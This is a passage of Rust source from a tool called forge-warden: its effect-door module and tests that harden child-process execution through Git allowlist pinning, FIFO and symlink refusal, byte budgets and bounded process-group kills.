//! Effect doors (ADR 0001): the only functions in forge-warden that reach outside the process.
//!
//! Each door is one small function carrying `#[expect(clippy::disallowed_methods, reason =
//! "door: …")]`. Adding an effect means adding a door here, in a reviewed diff; the workspace
//! `clippy.toml` makes the same call anywhere else a compile error, and `repo_invariants.rs`
//! fails if any other file opens a door.

use forge_warden_core::{Date, Exit};

/// Why a door could not be passed. It decides the registry exit, in one exhaustive `match`
/// (`Failure::from_door` in main.rs), so a new kind cannot ship unmapped (Q2-05).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DoorErrorKind {
    /// Reading or writing failed (exit 3, `check_input_output`).
    Io,
    /// The host is not set up as the door requires: an unsafe temporary directory, an unusable
    /// clock (exit 3, `check_environment`).
    Environment,
    /// The input is over its byte budget (exit 4, `reduce_input_size`).
    OverBudget,
    /// The door refuses the input itself: not a regular file, a symbolic link it does not follow,
    /// unsafe ownership or mode (exit 4, `change_input`).
    Refused,
}

/// A door that could not be passed.
#[derive(Debug, PartialEq, Eq)]
pub struct DoorError {
    /// What failed, for stderr.
    pub(crate) message: String,
    /// Why, which decides the exit.
    pub(crate) kind: DoorErrorKind,
}

impl DoorError {
    /// Why the door refused, which decides the exit (`Failure::from_door` in main.rs).
    #[must_use]
    pub const fn kind(&self) -> DoorErrorKind {
        self.kind
    }

    /// What failed, for stderr. Only a door constructs a `DoorError`; callers read it.
    #[must_use]
    pub fn into_message(self) -> String {
        self.message
    }

    fn io(what: &str, error: &std::io::Error) -> Self {
        Self {
            message: format!("{what}: {error}"),
            kind: DoorErrorKind::Io,
        }
    }

    fn refused(what: &str, why: &str) -> Self {
        Self {
            message: format!("{what}: {why}"),
            kind: DoorErrorKind::Refused,
        }
    }

    fn environment(message: String) -> Self {
        Self {
            message,
            kind: DoorErrorKind::Environment,
        }
    }
}

/// A harness=false target runs as a no-op during ordinary cargo test discovery. Only fixture
/// commands explicitly supply this test-build-only marker; release builds do not read it.
///
/// Test and fixture builds only (`cfg(any(test, fw_fixture_cli))`): the fixture CLI reaches this crate
/// through `RUSTFLAGS=--cfg fw_fixture_cli`, a switch `repo_invariants` refuses in every operational
/// build surface, as it refuses `--cfg test`.
#[must_use]
#[cfg(any(test, fw_fixture_cli))]
#[expect(clippy::disallowed_methods, reason = "test door: fixture CLI dispatch")]
pub fn fixture_cli_requested() -> bool {
    std::env::var_os("FORGE_WARDEN_TEST_POLICY_ROOT").is_some()
}

mod file;
#[cfg(test)]
#[cfg(not(fw_fixture_cli))]
use file::{ELOOP, FOLLOW_FLAGS, PIN_FLAGS};
use file::{Symlinks, open_regular, read_within};
pub use file::{read_file, read_stdin};

/// Today's date in UTC, from the system clock.
///
/// # Errors
///
/// A [`DoorError`] (environment) if the system clock is outside 1970..=9999.
#[expect(clippy::disallowed_methods, reason = "door: today")]
pub fn today() -> Result<Date, DoorError> {
    let since_epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_err(|e| DoorError::environment(format!("system clock is before 1970: {e}")))?;
    date_of_unix_seconds(since_epoch.as_secs())
}

/// The UTC calendar date of a Unix timestamp.
fn date_of_unix_seconds(seconds: u64) -> Result<Date, DoorError> {
    Date::from_unix_days(seconds / 86_400)
        .ok_or_else(|| DoorError::environment("system clock is outside 1970..=9999".to_owned()))
}

mod diagnose;
pub use diagnose::{diagnose, diagnose_json, emit};

/// The process status for a registry [`Exit`]: the only place a status is made (R-20). `main`
/// returns a `Status`, so every way the binary ends goes through the exit-code registry.
pub struct Status(pub Exit);

impl std::process::Termination for Status {
    fn report(self) -> std::process::ExitCode {
        std::process::ExitCode::from(self.0.entry().code)
    }
}

/// Capture OS arguments once; parsing and machine-output selection remain pure in main.rs.
#[must_use]
#[expect(clippy::disallowed_methods, reason = "door: arguments")]
pub fn arguments() -> Vec<std::ffi::OsString> {
    std::env::args_os().collect()
}

/// Child processes (ADR 0005 §2.4, §2.5): the ranker and Git run through these doors only.
pub mod child;

#[cfg(test)]
#[cfg(not(fw_fixture_cli))]
#[path = "../../forge-warden-cli/tests/support/process_env.rs"]
mod test_environment;

#[cfg(test)]
#[cfg(not(fw_fixture_cli))]
#[expect(
    clippy::disallowed_methods,
    clippy::disallowed_types,
    reason = "tests build fixtures and inspect processes; a panic is a failed test"
)]
mod child_tests {
    use super::child::{
        ChildFailure, ChildSpec, MAX_EXECUTABLE_BYTES, Program, pin_executable, pin_within,
        run_child,
    };
    use std::path::{Path, PathBuf};
    use std::time::{Duration, Instant};

    #[test]
    fn git_allowlist_is_closed_nonempty_and_canonical() {
        let digest = "a".repeat(64);
        let valid = format!(
            "schema = \"forge-warden.git-allowlist.v1\"\nrevision = 1\nsha256 = [\"{digest}\"]\n"
        );
        assert!(super::child::parse_git_allowlist(valid.as_bytes()).is_ok());
        for bad in [
            valid.replace("revision = 1", "revision = 0"),
            valid.replace("revision = 1", "revision = -1"),
            valid.replace("revision = 1", "revision = 1.0"),
            valid.replace("git-allowlist.v1", "git-allowlist.v2"),
            valid.replace(&digest, &"A".repeat(64)),
            valid.replace(&digest, "abcd"),
            valid.replace(&format!("[\"{digest}\"]"), "[]"),
            valid.replace(
                &format!("[\"{digest}\"]"),
                &format!("[\"{digest}\", \"{digest}\"]"),
            ),
            format!("{valid}unexpected = true\n"),
            format!("{valid}revision = 2\n"),
            String::new(),
        ] {
            assert!(
                super::child::parse_git_allowlist(bad.as_bytes()).is_err(),
                "accepted {bad:?}"
            );
        }
        assert!(super::child::parse_git_allowlist(&[255]).is_err());
    }

    #[test]
    fn scratch_calls_never_replace_a_live_directory() {
        let first = scratch("same-label");
        let sentinel = first.join("owned");
        std::fs::write(&sentinel, b"first caller").unwrap();
        let second = scratch("same-label");
        assert_ne!(first, second, "each scratch call owns a distinct path");
        assert_eq!(std::fs::read(&sentinel).unwrap(), b"first caller");
        std::fs::remove_dir_all(first).unwrap();
        std::fs::remove_dir_all(second).unwrap();
    }

    fn concurrent_git_policy_callers(callers: usize) {
        use std::sync::{Arc, Barrier};
        for iteration in 0..100 {
            let start = Arc::new(Barrier::new(callers.checked_add(1).unwrap()));
            let mut workers = Vec::new();
            for _ in 0..callers {
                let start = Arc::clone(&start);
                workers.push(std::thread::spawn(move || {
                    start.wait();
                    test_git()
                }));
            }
            start.wait();
            let results: Vec<_> = workers
                .into_iter()
                .map(std::thread::JoinHandle::join)
                .collect();
            assert!(
                results.iter().all(Result::is_ok),
                "{callers} test_git callers raced at iteration {iteration}"
            );
        }
    }

    #[test]
    fn three_concurrent_git_policy_callers_keep_snapshots_separate() {
        concurrent_git_policy_callers(3);
    }

    #[test]
    fn four_concurrent_git_policy_callers_keep_snapshots_separate() {
        concurrent_git_policy_callers(4);
    }

    fn test_git() -> super::child::AdmittedGit {
        admitted(Path::new("/usr/bin/git"))
    }

    /// An executable admitted as the test Git, through a fixture allowlist that lists its digest.
    fn admitted(program: &Path) -> super::child::AdmittedGit {
        use std::os::unix::fs::MetadataExt as _;
        let root = scratch("git-policy");
        let owner = std::fs::metadata(&root).unwrap().uid();
        let policy = root.join("allowlist.toml");
        let digest = forge_warden_core::seal::sha256_hex(&std::fs::read(program).unwrap());
        std::fs::write(&policy, format!("schema = \"forge-warden.git-allowlist.v1\"\nrevision = 1\nsha256 = [\"{digest}\"]\n")).unwrap();
        let git = super::child::fixture_git(program, &policy, &root, owner, false).unwrap();
        // Admission owns its descriptor and snapshot; only this call owns the fixture path.
        std::fs::remove_dir_all(&root).unwrap();
        git
    }

    #[test]
    fn git_facts_name_a_door_failure_and_an_unavailable_git() {
        // REFUSAL-MAP rows GitFactsFailure::Door and ::Unavailable, observed by variant.
        use super::child::{GitFactsFailure, git_facts_in};
        use std::os::unix::fs::{MetadataExt as _, PermissionsExt as _};
        let door = git_facts_in(&test_git(), b"", Path::new("relative/base"));
        assert!(
            matches!(&door, Err(GitFactsFailure::Door(e)) if e.kind == super::DoorErrorKind::Environment),
            "{door:?}"
        );
        // A "Git" the kernel will not execute: it has the ELF magic and the execute bit, so
        // admission takes it, but exec fails. No Git ran, so the facts are Unavailable, not Refused
        // (which means Git ran and rejected the patch).
        let root = scratch("git-unexecutable");
        let program = root.join("git");
        std::fs::write(&program, b"\x7fELF truncated").unwrap();
        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755)).unwrap();
        let policy = root.join("allowlist.toml");
        let digest = forge_warden_core::seal::sha256_hex(&std::fs::read(&program).unwrap());
        std::fs::write(&policy, format!("schema = \"forge-warden.git-allowlist.v1\"\nrevision = 1\nsha256 = [\"{digest}\"]\n")).unwrap();
        let owner = std::fs::metadata(&root).unwrap().uid();
        let broken = super::child::fixture_git(&program, &policy, &root, owner, false).unwrap();
        let base = scratch("git-unavailable");
        let unavailable = git_facts_in(&broken, b"x", &base);
        assert!(
            matches!(&unavailable, Err(GitFactsFailure::Unavailable(why)) if why.starts_with("git apply: ")),
            "{unavailable:?}"
        );
    }

    #[test]
    fn git_admission_binds_descriptor_and_exact_policy_bytes() {
        use super::child::{fixture_git, git_version};
        use std::os::unix::fs::MetadataExt as _;
        let root = scratch("git-admission");
        let owner = std::fs::metadata(&root).unwrap().uid();
        let executable = root.join("git");
        std::fs::copy("/usr/bin/git", &executable).unwrap();
        let digest = forge_warden_core::seal::sha256_hex(&std::fs::read(&executable).unwrap());
        let policy = root.join("allowlist.toml");
        let bytes = format!(
            "schema = \"forge-warden.git-allowlist.v1\"\nrevision = 1\nsha256 = [\"{digest}\"]\n"
        );
        std::fs::write(&policy, &bytes).unwrap();
        let git = fixture_git(&executable, &policy, &root, owner, false).unwrap();
        assert_eq!(git.sha256(), &digest);
        assert_eq!(
            git.allowlist_sha256(),
            Some(&forge_warden_core::seal::sha256_hex(bytes.as_bytes()))
        );
        let version = git_version(&git).unwrap();
        std::fs::rename(&executable, root.join("old-git")).unwrap();
        std::fs::copy("/usr/bin/false", &executable).unwrap();
        std::fs::write(&policy, bytes.replace(digest.as_str(), &"0".repeat(64))).unwrap();
        assert_eq!(git_version(&git).unwrap(), version);
        assert!(fixture_git(&executable, &policy, &root, owner, false).is_err());
        // Restoring the executable does not undo owner-policy revocation.
        std::fs::copy("/usr/bin/git", &executable).unwrap();
        assert!(fixture_git(&executable, &policy, &root, owner, false).is_err());
    }

    #[test]
    fn git_admission_refuses_unsafe_inputs_and_authority_never_falls_back() {
        use super::child::fixture_git;
        use std::os::unix::fs::{MetadataExt as _, PermissionsExt as _, symlink};
        let root = scratch("git-refusals");
        let owner = std::fs::metadata(&root).unwrap().uid();
        let policy = root.join("allowlist.toml");
        let git = Path::new("/usr/bin/git");
        assert!(
            fixture_git(git, &policy, &root, owner, false)
                .unwrap_err()
                .message
                .contains("no Git allowlist enrolled")
        );
        assert!(
            fixture_git(git, &policy, &root, owner, true)
                .unwrap()
                .allowlist_sha256()
                .is_none()
        );
        std::fs::write(&policy, b"not a policy").unwrap();
        assert!(fixture_git(git, &policy, &root, owner, true).is_err());
        let digest = forge_warden_core::seal::sha256_hex(&std::fs::read(git).unwrap());
        let bytes = format!(
            "schema = \"forge-warden.git-allowlist.v1\"\nrevision = 1\nsha256 = [\"{digest}\"]\n"
        );
        std::fs::write(&policy, &bytes).unwrap();
        assert!(fixture_git(git, &policy, &root, owner.checked_add(1).unwrap(), false).is_err());
        std::fs::set_permissions(&policy, std::fs::Permissions::from_mode(0o666)).unwrap();
        assert!(fixture_git(git, &policy, &root, owner, true).is_err());
        std::fs::set_permissions(&policy, std::fs::Permissions::from_mode(0o600)).unwrap();
        let linked = root.join("linked.toml");
        symlink(&policy, &linked).unwrap();
        assert!(fixture_git(git, &linked, &root, owner, true).is_err());
        std::fs::write(&policy, vec![b' '; 65 * 1024]).unwrap();
        assert!(fixture_git(git, &policy, &root, owner, true).is_err());
        std::fs::write(&policy, bytes.replace(digest.as_str(), &"0".repeat(64))).unwrap();
        assert!(fixture_git(git, &policy, &root, owner, true).is_err());
        let script = root.join("script");
        std::fs::write(&script, b"#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).unwrap();
        std::fs::remove_file(&policy).unwrap();
        assert!(fixture_git(&script, &policy, &root, owner, true).is_err());
    }

    #[test]
    fn git_admission_refuses_fifo_parent_links_writable_executable_and_oversize() {
        use super::child::{MAX_EXECUTABLE_BYTES, fixture_git};
        use std::os::unix::fs::{MetadataExt as _, PermissionsExt as _, symlink};
        let root = scratch("git-special-files");
        let owner = std::fs::metadata(&root).unwrap().uid();
        let absent = root.join("absent.toml");
        let fifo = root.join("fifo");
        assert!(
            command("/usr/bin/mkfifo")
                .arg(&fifo)
                .status()
                .unwrap()
                .success()
        );
        let started = Instant::now();
        assert!(fixture_git(Path::new("/usr/bin/git"), &fifo, &root, owner, true).is_err());
        assert!(
            fixture_git(&fifo, &absent, &root, owner, true)
                .unwrap_err()
                .message
                .contains("not a regular file")
        );
        assert!(started.elapsed() < Duration::from_secs(2));
        let executable = root.join("git");
        std::fs::copy("/usr/bin/git", &executable).unwrap();
        std::fs::set_permissions(&executable, std::fs::Permissions::from_mode(0o777)).unwrap();
        assert!(fixture_git(&executable, &absent, &root, owner, true).is_err());
        std::fs::set_permissions(&executable, std::fs::Permissions::from_mode(0o644)).unwrap();
        assert!(fixture_git(&executable, &absent, &root, owner, true).is_err());
        std::fs::set_permissions(&executable, std::fs::Permissions::from_mode(0o755)).unwrap();
        let linked = root.join("linked-git");
        symlink(&executable, &linked).unwrap();
        assert!(fixture_git(&linked, &absent, &root, owner, true).is_err());
        let parent = root.join("linked-parent");
        symlink(&root, &parent).unwrap();
        assert!(
            fixture_git(&parent.join("git"), &absent, &root, owner, true)
                .unwrap_err()
                .message
                .contains("parent is not a real directory")
        );
        let file = std::fs::OpenOptions::new()
            .write(true)
            .open(&executable)
            .unwrap();
        file.set_len(
            u64::try_from(MAX_EXECUTABLE_BYTES)
                .unwrap()
                .saturating_add(1),
        )
        .unwrap();
        drop(file);
        assert!(
            fixture_git(&executable, &absent, &root, owner, true)
                .unwrap_err()
                .message
                .contains("file exceeds byte budget")
        );
        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o777)).unwrap();
        assert!(fixture_git(Path::new("/usr/bin/git"), &absent, &root, owner, true).is_err());
        std::fs::set_permissions(&root, std::fs::Permissions::from_mode(0o700)).unwrap();
    }

    #[test]
    fn git_parent_absence_is_distinct_from_metadata_failure() {
        use super::child::fixture_git;
        use std::os::unix::fs::MetadataExt as _;
        let root = scratch("git-parent-errors");
        let owner = std::fs::metadata(&root).unwrap().uid();
        let executable = Path::new("/usr/bin/git");
        let missing = root.join("missing-parent").join("allowlist.toml");
        let unpinned = fixture_git(executable, &missing, &root, owner, true).unwrap();
        assert_eq!(unpinned.allowlist_sha256(), None);
        assert!(
            fixture_git(executable, &missing, &root, owner, false)
                .unwrap_err()
                .message
                .contains("no Git allowlist enrolled")
        );

        // ENAMETOOLONG is reproducible even as root; permission-denial fixtures are not.
        let impossible_parent = root.join("x".repeat(4096));
        let metadata_error = std::fs::symlink_metadata(&impossible_parent).unwrap_err();
        assert_ne!(metadata_error.kind(), std::io::ErrorKind::NotFound);
        let unreadable = impossible_parent.join("allowlist.toml");
        for advisory in [false, true] {
            let error = fixture_git(executable, &unreadable, &root, owner, advisory).unwrap_err();
            assert!(
                !error.message.contains("no Git allowlist enrolled"),
                "metadata errors must not become absent-policy fallback"
            );
        }
    }

    #[test]
    fn git_policy_budget_is_exactly_64_kib() {
        use super::child::fixture_git;
        use std::os::unix::fs::MetadataExt as _;
        let root = scratch("git-policy-budget");
        let owner = std::fs::metadata(&root).unwrap().uid();
        let path = root.join("allowlist.toml");
        let executable = Path::new("/usr/bin/git");
        let digest = forge_warden_core::seal::sha256_hex(&std::fs::read(executable).unwrap());
        let mut bytes = format!(
            "schema = \"forge-warden.git-allowlist.v1\"\nrevision = 1\nsha256 = [\"{digest}\"]\n#"
        )
        .into_bytes();
        bytes.resize(65536, b' ');
        std::fs::write(&path, &bytes).unwrap();
        assert!(fixture_git(executable, &path, &root, owner, false).is_ok());
        bytes.push(b' ');
        std::fs::write(&path, bytes).unwrap();
        assert!(
            fixture_git(executable, &path, &root, owner, false)
                .unwrap_err()
                .message
                .contains("file exceeds byte budget")
        );
    }

    fn spec<'a>(program: Program<'a>, args: &'a [&'a str], stdin: &'a [u8]) -> ChildSpec<'a> {
        ChildSpec {
            program,
            args,
            stdin,
            env: &[],
            cwd: Path::new("/"),
            timeout: Duration::from_secs(5),
            stdout_cap: 8 * 1024 * 1024,
            stderr_cap: 64 * 1024,
        }
    }

    fn command(program: &str) -> std::process::Command {
        static HOME: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
        let home = HOME.get_or_init(|| scratch("process-home"));
        let mut cmd = std::process::Command::new(program);
        super::test_environment::configure(&mut cmd, home);
        cmd
    }

    fn sh(script: &str) -> Vec<&str> {
        vec!["-c", script]
    }

    /// No live process has `marker` in its command line, read straight from `/proc` (no `pgrep`:
    /// the offline verification image has none).
    fn none_left(marker: &str) -> bool {
        std::fs::read_dir("/proc")
            .unwrap()
            .filter_map(Result::ok)
            .filter(|e| {
                e.file_name()
                    .to_string_lossy()
                    .bytes()
                    .all(|b| b.is_ascii_digit())
            })
            .filter_map(|e| std::fs::read(e.path().join("cmdline")).ok())
            .map(|raw| String::from_utf8_lossy(&raw).replace('\0', " "))
            .all(|cmdline| !cmdline.contains(marker))
    }

    /// Create `to` as a copy of `from` by a child process, so this test process never holds a write
    /// descriptor on a file it later executes. With one open, another test thread's concurrent fork
    /// inherits it until that child's exec, and executing the file fails with ETXTBSY (MEASURED: 4 in
    /// 2000 runs of `a_pinned_executable_runs_the_hashed_bytes_after_its_path_is_swapped` on 9d57295).
    fn copy_out_of_process(from: &str, to: &Path) {
        let status = command("/usr/bin/cp")
            .arg("--")
            .arg(from)
            .arg(to)
            .status()
            .unwrap();
        assert!(status.success(), "cp {from} {}", to.display());
    }

    fn scratch(name: &str) -> PathBuf {
        static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
        for _ in 0..128 {
            let serial = NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let dir = std::env::temp_dir()
                .join(format!("fw-child-{}-{name}-{serial}", std::process::id()));
            match std::fs::create_dir(&dir) {
                Ok(()) => return dir,
                Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => {}
                Err(error) => panic!("creating test scratch {}: {error}", dir.display()),
            }
        }
        panic!("unique test scratch attempts exhausted");
    }

    #[test]
    fn every_open_is_nonblocking_and_the_pin_adds_nofollow_exactly() {
        // Reference values from the Linux headers (x86_64, aarch64).
        use super::child::O_NOFOLLOW;
        const O_NONBLOCK: i32 = 0o4_000;
        assert_eq!(O_NOFOLLOW & O_NONBLOCK, 0, "disjoint bits");
        assert_eq!(super::FOLLOW_FLAGS, O_NONBLOCK);
        assert_eq!(super::PIN_FLAGS, O_NOFOLLOW | O_NONBLOCK);
        assert_eq!(super::ELOOP, 40);
    }

    #[test]
    fn every_file_door_refuses_a_fifo_at_once_not_waited_on() {
        // Q2-02: `--policy`, `--patch` and `--rank` pointed at a FIFO with no writer must be refused,
        // not block forever. Every door that opens a named file is in this table.
        type Door = fn(&Path) -> Result<(), String>;
        let doors: [(&str, Door); 2] = [
            ("read_file", |p| {
                super::read_file(p).map(drop).map_err(|e| e.message)
            }),
            ("pin_executable", |p| {
                pin_executable(p).map(drop).map_err(|e| e.message)
            }),
        ];
        for (name, door) in doors {
            let dir = scratch(&format!("fifo-{name}"));
            let fifo = dir.join("input");
            let made = command("/usr/bin/mkfifo").arg(&fifo).status().unwrap();
            assert!(made.success());
            let (tx, rx) = std::sync::mpsc::channel();
            let target = fifo.clone();
            let opening = std::thread::spawn(move || {
                let _sent = tx.send(door(&target));
            });
            let outcome = rx.recv_timeout(Duration::from_millis(900));
            if outcome.is_err() {
                // Release a blocked open (the writer closes at once, so a blocked read sees EOF)
                // so this test fails instead of hanging the suite.
                let _writer = std::fs::OpenOptions::new().write(true).open(&fifo);
            }
            let _joined = opening.join();
            let Ok(result) = outcome else {
                panic!("{name} blocked on a FIFO for 900 ms");
            };
            let refused = result.unwrap_err();
            assert!(refused.ends_with("not a regular file"), "{name}: {refused}");
            let _cleaned = std::fs::remove_dir_all(&dir);
        }
    }

    #[test]
    fn an_escaped_descendant_holding_stdin_cannot_stretch_the_deadline() {
        // Q2-03: the child starts a `setsid` descendant (it leaves the group, so the group kill
        // misses it) that keeps stdin open and never reads, then exits 0. With more input than a
        // pipe holds, the stdin writer blocks; the call must still end at its deadline.
        // The descendant touches a marker only after `setsid`, and the child waits for it before
        // exiting, so the group kill can never catch the descendant still in the group (measured:
        // without the wait, 1 run in ~100 killed it first and the writer saw EPIPE instead).
        // Q-DOOR.2: with job control off, POSIX gives an asynchronous list stdin = /dev/null
        // before its own redirections, so in dash (`/bin/sh` on Debian and Ubuntu) `<&0 &` hands
        // the descendant /dev/null, not the pipe. The pipe is therefore saved on fd 3 first and
        // passed as `<&3`, which holds in every POSIX shell. The descendant then writes what its
        // fd 0 really is into the marker (under a temporary name, renamed when complete), and the
        // test refuses to count a run in which it is not the pipe.
        let dir = scratch("escaped");
        let marker = dir.join("left-the-group");
        let script = format!(
            "exec 3<&0; /usr/bin/setsid /bin/sh -c '/usr/bin/readlink /proc/self/fd/0 > \"$1.tmp\" \
             && /usr/bin/mv \"$1.tmp\" \"$1\"; exec /usr/bin/sleep 6' x '{}' \
             <&3 3<&- >/dev/null 2>&1 & exec 3<&-; while [ ! -e '{}' ]; do :; done; exit 0",
            marker.display(),
            marker.display()
        );
        let input = vec![b'x'; 1024 * 1024];
        let args = sh(&script);
        let mut held = spec(Program::Absolute(Path::new("/bin/sh")), &args, &input);
        held.timeout = Duration::from_secs(1);
        let started = Instant::now();
        let got = run_child(&held);
        let took = started.elapsed();
        assert!(
            took < Duration::from_secs(4),
            "run_child took {took:?}: the stdin writer outlived the deadline"
        );
        let held_stdin = std::fs::read_to_string(&marker)
            .expect("the descendant never left the group, so this did not test the escaped case");
        assert!(
            held_stdin.starts_with("pipe:"),
            "the descendant's stdin was {held_stdin:?}, not the pipe, so this did not test the \
             escaped case (is this shell giving the asynchronous list /dev/null?)"
        );
        assert_eq!(got, Err(ChildFailure::Timeout));
        let _cleaned = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_group_kill_that_hangs_is_bounded_and_reported() {
        // Bastion E3c-O4-01 / Q2-04 (3): the kill is a third child; it has its own deadline. A
        // stand-in that never exits must not hold the call, and is reported, not ignored.
        use super::child::run_child_killing_with;
        use std::os::unix::fs::PermissionsExt as _;
        let dir = scratch("hung-kill");
        let source = dir.join("source");
        std::fs::write(&source, "#!/bin/sh\nexec /usr/bin/sleep 30\n").unwrap();
        let kill = dir.join("kill");
        copy_out_of_process(source.to_str().unwrap(), &kill);
        std::fs::set_permissions(&kill, std::fs::Permissions::from_mode(0o755)).unwrap();
        let args = sh("exit 0");
        let quick = spec(Program::Absolute(Path::new("/bin/sh")), &args, b"");
        let started = Instant::now();
        let got = run_child_killing_with(&quick, &kill);
        let took = started.elapsed();
        assert!(
            took < Duration::from_secs(5),
            "the hung kill held the call for {took:?}"
        );
        match got {
            Err(ChildFailure::Io(why)) => assert!(why.contains("did not finish"), "{why}"),
            other => panic!("{other:?}"),
        }
        let _cleaned = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn exit_is_read_from_the_state_after_the_last_parenthesis() {
        use super::child::has_exited;
        assert_eq!(has_exited(b"42 (sh) Z 1 42 42"), Some(true));
        assert_eq!(has_exited(b"42 (sh) X 1 42 42"), Some(true));
        assert_eq!(has_exited(b"42 (sh) S 1 42 42"), Some(false));
        assert_eq!(has_exited(b"42 (sh) R 1 42 42"), Some(false));
        // A command name may hold `)`, spaces and a fake state; only the last `)` counts.
        assert_eq!(has_exited(b"42 (a) Z (b) S 1 42 42"), Some(false));
        assert_eq!(has_exited(b"42 (a) S (b) Z 1 42 42"), Some(true));
        assert_eq!(has_exited(b"42 (sh)"), None);
        assert_eq!(has_exited(b"no parenthesis"), None);
    }

    #[test]
    fn a_group_kill_that_cannot_run_or_fails_is_reported() {
        // Q2-04: a kill that could not be started, or that failed, leaves grandchildren holding the
        // pipes; it is a failure of the call, never silence.
        use super::child::run_child_killing_with;
        let args = sh("exit 0");
        let quick = spec(Program::Absolute(Path::new("/bin/sh")), &args, b"");
        for kill in ["/nonexistent/kill", "/usr/bin/false"] {
            match run_child_killing_with(&quick, Path::new(kill)) {
                Err(ChildFailure::Io(why)) => assert!(
                    why.starts_with("killing the child's process group"),
                    "{kill}: {why}"
                ),
                other => panic!("{kill}: {other:?}"),
            }
        }
    }

    #[test]
    fn git_facts_reproduces_the_coverage_corpus_captures_byte_for_byte() {
        use super::child::{GitFactsFailure, git_facts};
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../fixtures/coverage");
        let index: serde_json::Value =
            serde_json::from_slice(&std::fs::read(root.join("cases.json")).unwrap()).unwrap();
        let cases = index["cases"].as_array().unwrap();
        assert_eq!(cases.len(), 61);
        for case in cases {
            let name = case["name"].as_str().unwrap();
            let patch = std::fs::read(root.join(format!("{name}.patch"))).unwrap();
            let got = git_facts(&test_git(), &patch);
            if case["git_rc"] == serde_json::json!([0, 0]) {
                let (numstat, summary) = got.unwrap_or_else(|e| panic!("{name}: {e:?}"));
                assert_eq!(
                    numstat,
                    std::fs::read(root.join(format!("{name}.numstat"))).unwrap(),
                    "{name}"
                );
                assert_eq!(
                    summary,
                    std::fs::read(root.join(format!("{name}.summary"))).unwrap(),
                    "{name}"
                );
            } else {
                assert!(
                    matches!(got, Err(GitFactsFailure::Refused(_))),
                    "{name}: {got:?}"
                );
            }
        }
    }

    #[test]
    fn a_private_dir_is_empty_0700_and_removed_on_drop_and_a_missing_git_is_unavailable() {
        use super::child::{PrivateDir, git_facts};
        use std::os::unix::fs::PermissionsExt as _;
        // An exclusive base: in the shared temp dir another test's private dir may legitimately
        // reuse this process-scoped name after the drop (Bastion, C1c v4.2 receipt).
        let base = scratch("private-dir");
        let dir = PrivateDir::create_in(&base).unwrap();
        let path = dir.path().to_owned();
        let meta = std::fs::metadata(&path).unwrap();
        assert!(meta.is_dir());
        assert_eq!(meta.permissions().mode() & 0o777, 0o700);
        assert_eq!(std::fs::read_dir(&path).unwrap().count(), 0);
        drop(dir);
        assert!(!path.exists(), "{}", path.display());
        let tiny_patch = b"diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n";
        assert!(git_facts(&test_git(), tiny_patch).is_ok());
        assert!(
            super::child::admit_git_advisory(Path::new("/nonexistent/git"))
                .unwrap_err()
                .message
                .contains("test fixture policy root is required")
        );
    }

    #[test]
    fn child_exit_keeps_a_bounded_stderr_prefix_and_overflow_still_refuses() {
        use super::child::stderr_excerpt;
        let command = sh("printf 'reason\\033\\000\\n' >&2; exit 7");
        let out = run_child(&spec(
            Program::Absolute(Path::new("/bin/sh")),
            &command,
            b"",
        ));
        assert_eq!(
            out,
            Err(ChildFailure::Exit {
                code: 7,
                stderr: "reason\x1b\0\n".to_owned()
            })
        );
        assert_eq!(stderr_excerpt(&vec![b'x'; 513]), "x".repeat(512));
        assert_eq!(stderr_excerpt(&vec![b'x'; 512]), "x".repeat(512));
        assert_eq!(stderr_excerpt(b""), "");
        for bytes in [
            vec![0; 1024],
            "\u{202e}".repeat(1024).into_bytes(),
            vec![255; 1024],
            vec![b'\\'; 1024],
        ] {
            let safe = forge_warden_core::render::terminal_safe(&stderr_excerpt(&bytes));
            assert!(safe.len() <= 512);
            assert!(safe.bytes().all(|b| (0x20..=0x7e).contains(&b)));
        }
    }

    #[test]
    fn kernel_uuid_admission_refuses_malformed_entropy() {
        use super::child::uuid_suffix;
        let valid = b"12345678-1234-4234-9234-123456789abc\n";
        assert_eq!(
            uuid_suffix(valid).unwrap(),
            "12345678-1234-4234-9234-123456789abc"
        );
        // Exercise both hex boundaries and every RFC variant deterministically; runtime UUIDs
        // alone would make these admission boundaries depend on a random sample.
        for variant in ['8', '9', 'a', 'b'] {
            let value = format!("00000000-ffff-4fff-{variant}fff-ffffffffffff\n");
            assert_eq!(uuid_suffix(value.as_bytes()).unwrap(), value.trim_end());
        }
        for position in [8, 13, 18, 23] {
            let mut malformed = valid.to_vec();
            malformed[position] = b'0';
            assert!(uuid_suffix(&malformed).is_err());
        }
        for bad in [
            b"".as_slice(),
            b"\n",
            b"\xff\n",
            b"12345678-1234-4234-9234-123456789ab\n",
            b"12345678-1234-4234-9234-123456789abcd\n",
            b"12345678-1234-4234-9234-123456789abF\n",
            b"../predictable\n",
            b"12345678-1234-1234-9234-123456789abc\n",
            b"12345678-1234-4234-7234-123456789abc\n",
            b"12345678-1234-4234-9234-123456789abc",
            b"12345678-1234-4234-9234-123456789abg\n",
        ] {
            assert!(uuid_suffix(bad).is_err(), "{bad:?}");
        }
    }

    // ADR0010 temporary-base bullet: reject before creating anything or running a child.
    #[test]
    fn adr0010_relative_tmpdir_refuses_without_fallback() {
        assert!(
            super::child::Isolation::create_in(Path::new("relative/base"))
                .err()
                .unwrap()
                .message
                .contains("not absolute")
        );
    }
    #[test]
    fn adr0010_colon_tmpdir_refuses_without_fallback() {
        let base = scratch("adr0010-colon");
        let path = base.join("a:b");
        std::fs::create_dir(&path).unwrap();
        assert!(
            super::child::Isolation::create_in(&path)
                .err()
                .unwrap()
                .message
                .contains("contains ':'")
        );
        assert_eq!(std::fs::read_dir(&path).unwrap().count(), 0);
    }
    #[test]
    fn adr0010_non_utf8_tmpdir_refuses_without_fallback() {
        use std::os::unix::ffi::OsStrExt as _;
